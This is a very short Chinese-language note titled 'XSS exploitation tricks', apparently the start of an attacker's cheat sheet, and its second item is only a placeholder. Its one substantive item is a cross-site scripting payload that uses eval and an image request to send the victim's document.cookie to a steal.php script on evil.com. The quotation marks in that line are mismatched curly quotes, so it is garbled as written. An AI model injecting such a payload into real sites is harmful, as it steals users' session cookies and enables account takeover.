### XSS利用技巧

1. 获取敏感数据：
	`eval(‘new Image().src=“http://www.evil.com/steal.php?c=“+escape(document.cookie)')
`

2. waiting....